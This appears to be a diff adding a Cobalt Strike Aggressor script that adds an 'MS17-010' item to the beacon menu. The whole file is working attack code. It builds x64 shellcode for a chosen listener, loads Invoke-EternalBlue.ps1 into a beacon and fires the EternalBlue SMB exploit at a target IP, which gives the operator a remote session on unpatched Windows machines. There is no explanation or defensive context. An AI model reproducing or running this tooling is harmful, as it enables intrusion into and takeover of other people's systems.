@@ -1,0 +1,21 @@
+sub ms17_010 {
+	$listener = $3['listener'];
+	$stager = transform(shellcode($listener, false, "x64"),"array");
+	bpowershell_import!($bid, getFileProper(script_resource("modules/pwn"), "Invoke-EternalBlue.ps1"));
+    bpowerpick($bid, 'Invoke-EternalBlue -Target '.$3['ip'].' -Shellcode @('.$stager.') -InitialGrooms '.$3['grooms'].' -MaxAttempts '.$3['max_attempts']);
+}
+
+popup beacon_bottom {
+	menu "&MS17-010" {
+		item "ms17-010"{
+			$bid = $1;
+			$dialog = dialog("Ms17-010", %(ip => "192.168.1.1", grooms => "12", max_attempts => "5", bid => $bid, listener => 'listener'), &ms17_010);
+			drow_text($dialog, "ip",  "IP: "); 	
+			drow_listener($dialog, "listener", "Listener: ");
+			drow_text($dialog, "grooms",  "Grooms: ");
+			drow_text($dialog, "max_attempts",  "Attemps: ");
+			dbutton_action($dialog, "Go");
+			dialog_show($dialog);
+		}
+	}
+}
